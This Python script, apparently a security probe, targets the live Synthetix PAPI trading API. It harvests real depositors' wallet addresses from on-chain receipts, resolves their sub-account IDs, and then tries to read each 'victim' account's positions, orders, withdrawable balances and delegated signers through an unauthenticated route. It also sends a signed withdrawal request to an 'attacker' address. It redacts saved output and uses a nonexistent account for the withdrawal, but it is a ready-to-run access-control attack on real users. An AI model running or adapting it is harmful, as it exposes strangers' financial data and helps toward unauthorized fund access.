#!/usr/bin/env python3
"""Redacted, low-noise REST dispatcher boundary probe for Synthetix PAPI.

The probe checks whether private account-query or write action names are
accidentally dispatched by the unauthenticated /info route and whether public
action names are accepted by /trade without auth. Candidate account identifiers
come only from public deposit receipts. No raw account response values are saved.
The sole write-shaped control uses a deterministic empty EOA, a deliberately
nonexistent account ID, amount 1, and its own destination; it cannot touch a real
user or funds.
"""

from __future__ import annotations

import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from typing import Any

from eth_account import Account
from eth_account.messages import encode_typed_data
from eth_utils import to_checksum_address

OUT = pathlib.Path("rest_route_boundary")
OUT.mkdir(parents=True, exist_ok=True)

RPC_URLS = (
    "https://ethereum-rpc.publicnode.com",
    "https://eth.llamarpc.com",
    "https://rpc.mevblocker.io",
    "https://eth.drpc.org",
)
PAPI_INFO = "https://papi.synthetix.io/v1/info"
PAPI_TRADE = "https://papi.synthetix.io/v1/trade"
DEPOSIT_PROXY = "0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B"
ASSET_DEPOSITED_TOPIC = "0x8d9f8eed9603fe0e069574aaf008e644885b52d54ba86f026277ac9db1c2d08a"
DEPOSIT_TX_HASHES = (
    "0xb8099b559a99ef2e5122c7b37e2288cd21c90ab4a9cd282ebd556fac21c8618c",
    "0xff4a76000616a7bd6e7eec8dc8dd5ddc3aad54d61ae14e096b22721d1d4993fa",
    "0xff49e1668459cf9d6740fa406bb6e1714495451614bf7a0cbba287fd012d0406",
    "0x2bcf6ce3cd19759da83c531db0c37756af79371e4acd0c5e94e870c0485cd0dc",
    "0x37e4ed3427007aa6c4f2d3297fd12b42b854ae55fae5b1203fac5406d9b170ec",
    "0x3768526db1bd1a128785882ad010ba415508d51ff11b603872fc7d45789ccfc8",
    "0x0c9bf25d6b94eec665034bccfe2e72132084f6e540eae6bdfd3f6f4db25d3f30",
)
PRIVATE_KEY = "0x" + "77" * 32
ATTACKER = Account.from_key(PRIVATE_KEY)
NONEXISTENT_ID = 999_999_999_999_999_977
UA = "Mozilla/5.0 (compatible; authorized-low-noise-security-review/1.0)"
MAX_BODY = 2 * 1024 * 1024

DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
DOMAIN = {
    "name": "Synthetix",
    "version": "1",
    "chainId": 1,
    "verifyingContract": "0x0000000000000000000000000000000000000000",
}
WITHDRAW_TYPES = {
    "EIP712Domain": DOMAIN_FIELDS,
    "WithdrawCollateral": [
        {"name": "subAccountId", "type": "uint256"},
        {"name": "symbol", "type": "string"},
        {"name": "amount", "type": "string"},
        {"name": "destination", "type": "address"},
        {"name": "nonce", "type": "uint256"},
        {"name": "expiresAfter", "type": "uint256"},
    ],
}

DIAG: dict[str, Any] = {"rpcCalls": 0, "receiptsChecked": 0, "papiInfoRequests": []}


def digest(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def redact(value: Any) -> str | None:
    if value is None:
        return None
    text = str(value)
    text = re.sub(r"0x[a-fA-F0-9]{40}", "<address>", text)
    text = re.sub(r"0x[a-fA-F0-9]{64,}", "<hex>", text)
    text = re.sub(r"\b\d{6,}\b", "<number>", text)
    return text[:500]


def post_json(url: str, payload: dict[str, Any], timeout: int = 45) -> tuple[int, bytes, dict[str, str], float]:
    data = json.dumps(payload, separators=(",", ":")).encode()
    request = urllib.request.Request(
        url,
        data=data,
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    started = time.monotonic()
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read(MAX_BODY + 1)
            if len(body) > MAX_BODY:
                raise ValueError("response too large")
            return response.status, body, dict(response.headers.items()), time.monotonic() - started
    except urllib.error.HTTPError as exc:
        return (
            exc.code,
            exc.read(MAX_BODY + 1),
            dict(exc.headers.items()) if exc.headers else {},
            time.monotonic() - started,
        )


def rpc(method: str, params: list[Any]) -> Any:
    DIAG["rpcCalls"] += 1
    errors: list[str] = []
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    for url in RPC_URLS:
        try:
            status, body, _, _ = post_json(url, payload)
            parsed = json.loads(body)
            if status >= 400 or "error" in parsed:
                errors.append(f"status={status}")
                continue
            return parsed["result"]
        except Exception as exc:  # noqa: BLE001
            errors.append(type(exc).__name__)
    raise RuntimeError("RPC failed: " + " | ".join(errors))


def schema(value: Any, depth: int = 0) -> Any:
    if depth >= 4:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(key): schema(item, depth + 1) for key, item in sorted(value.items())}
    if isinstance(value, list):
        return {"type": "list", "count": len(value), "sample": schema(value[0], depth + 1) if value else None}
    return type(value).__name__


def topic_address(value: str) -> str:
    return to_checksum_address("0x" + value[-40:])


def account_ids(wallet: str) -> list[str]:
    status, body, _, _ = post_json(
        PAPI_INFO,
        {"params": {"action": "getSubAccountIds", "walletAddress": wallet, "includeDelegations": True}},
    )
    try:
        parsed = json.loads(body)
    except Exception:
        parsed = None
    response = parsed.get("response") if isinstance(parsed, dict) else None
    values: list[Any] = []
    if status == 200 and isinstance(parsed, dict) and parsed.get("status") == "ok":
        if isinstance(response, list):
            values = response
        elif isinstance(response, dict):
            values = response.get("subAccountIds", []) or []
    result = [str(value) for value in values if str(value).isdigit() and int(str(value)) > 0]
    DIAG["papiInfoRequests"].append(
        {
            "httpStatus": status,
            "apiStatus": parsed.get("status") if isinstance(parsed, dict) else None,
            "responseSchema": schema(response),
            "ownedCount": len(result),
            "bodySha256": digest(body),
        }
    )
    return result


def discover_target() -> tuple[str, str]:
    for tx_hash in DEPOSIT_TX_HASHES:
        DIAG["receiptsChecked"] += 1
        receipt = rpc("eth_getTransactionReceipt", [tx_hash])
        if not isinstance(receipt, dict):
            continue
        for log in receipt.get("logs", []):
            topics = log.get("topics", [])
            if (
                str(log.get("address", "")).lower() == DEPOSIT_PROXY.lower()
                and len(topics) >= 4
                and str(topics[0]).lower() == ASSET_DEPOSITED_TOPIC.lower()
            ):
                beneficiary = topic_address(topics[2])
                ids = account_ids(beneficiary)
                if ids:
                    return beneficiary, ids[0]
    raise RuntimeError("No public beneficiary with discoverable owned account")


def format_signature(signed: Any) -> dict[str, Any]:
    return {
        "v": signed.v,
        "r": "0x" + format(signed.r, "064x"),
        "s": "0x" + format(signed.s, "064x"),
    }


def signed_withdraw_payload() -> dict[str, Any]:
    nonce = int(time.time() * 1000)
    expires_after = nonce + 60_000
    message = {
        "subAccountId": NONEXISTENT_ID,
        "symbol": "USDT",
        "amount": "1",
        "destination": ATTACKER.address,
        "nonce": nonce,
        "expiresAfter": expires_after,
    }
    signed = ATTACKER.sign_message(
        encode_typed_data(
            full_message={
                "types": WITHDRAW_TYPES,
                "primaryType": "WithdrawCollateral",
                "domain": DOMAIN,
                "message": message,
            }
        )
    )
    return {
        "signature": format_signature(signed),
        "nonce": nonce,
        "expiresAfter": expires_after,
        "params": {
            "action": "withdrawCollateral",
            "subaccountId": str(NONEXISTENT_ID),
            "walletAddress": ATTACKER.address,
            "symbol": "USDT",
            "amount": "1",
            "destination": ATTACKER.address,
        },
    }


def summarize(name: str, route: str, status: int, body: bytes, headers: dict[str, str], elapsed: float) -> dict[str, Any]:
    try:
        parsed = json.loads(body)
    except Exception:
        parsed = None
    response = parsed.get("response") if isinstance(parsed, dict) else None
    error = parsed.get("error") if isinstance(parsed, dict) else None
    error_code = error.get("code") if isinstance(error, dict) else None
    error_message = error.get("message") if isinstance(error, dict) else error
    success = bool(status == 200 and isinstance(parsed, dict) and parsed.get("status") == "ok")
    return {
        "name": name,
        "route": route,
        "httpStatus": status,
        "elapsedMs": round(elapsed * 1000, 2),
        "apiStatus": parsed.get("status") if isinstance(parsed, dict) else None,
        "apiSuccess": success,
        "errorCode": error_code,
        "errorMessageRedacted": redact(error_message),
        "responseSchema": schema(response),
        "bodySha256": digest(body),
        "bodyBytes": len(body),
        "requestIdPresent": bool(headers.get("X-Request-Id") or headers.get("x-request-id")),
    }


def run_case(name: str, route: str, payload: dict[str, Any]) -> dict[str, Any]:
    status, body, headers, elapsed = post_json(route, payload)
    return summarize(name, route.rsplit("/", 1)[-1], status, body, headers, elapsed)


def main() -> None:
    beneficiary, victim_id = discover_target()
    private_read_cases = (
        ("info_get_subaccount", {"params": {"action": "getSubAccount", "subAccountId": victim_id}}),
        ("info_get_positions", {"params": {"action": "getPositions", "subAccountId": victim_id}}),
        ("info_get_open_orders", {"params": {"action": "getOpenOrders", "subAccountId": victim_id}}),
        ("info_get_withdrawable_amounts", {"params": {"action": "getWithdrawableAmounts", "subAccountId": victim_id, "symbols": ["USDT", "WETH"]}}),
        ("info_get_delegated_signers", {"params": {"action": "getDelegatedSigners", "subAccountId": victim_id}}),
        ("info_get_delegations_for_delegate", {"params": {"action": "getDelegationsForDelegate", "subAccountId": victim_id, "owningAddress": beneficiary}}),
    )

    tests: list[dict[str, Any]] = []
    for name, payload in private_read_cases:
        tests.append(run_case(name, PAPI_INFO, payload))
        time.sleep(0.7)

    tests.append(run_case("info_signed_withdraw_nonexistent_control", PAPI_INFO, signed_withdraw_payload()))
    time.sleep(0.7)
    tests.append(run_case("trade_public_get_markets_without_auth", PAPI_TRADE, {"params": {"action": "getMarkets"}}))

    unexpected_private_success = any(
        test["apiSuccess"] for test in tests if test["name"].startswith("info_get_")
    )
    unexpected_write_dispatch = next(
        (test["apiSuccess"] for test in tests if test["name"] == "info_signed_withdraw_nonexistent_control"),
        False,
    )
    summary = {
        "safety": "Read-only private-route confusion checks plus one synthetic nonexistent-account write-shaped control; no real account or funds touched.",
        "attackerAddress": ATTACKER.address,
        "victimBeneficiarySha256": digest(beneficiary.lower()),
        "victimSubaccountIdSha256": digest(victim_id),
        "unexpectedPrivateReadSuccess": unexpected_private_success,
        "unexpectedWriteSuccess": unexpected_write_dispatch,
        "tests": tests,
        "diagnostics": DIAG,
    }
    (OUT / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
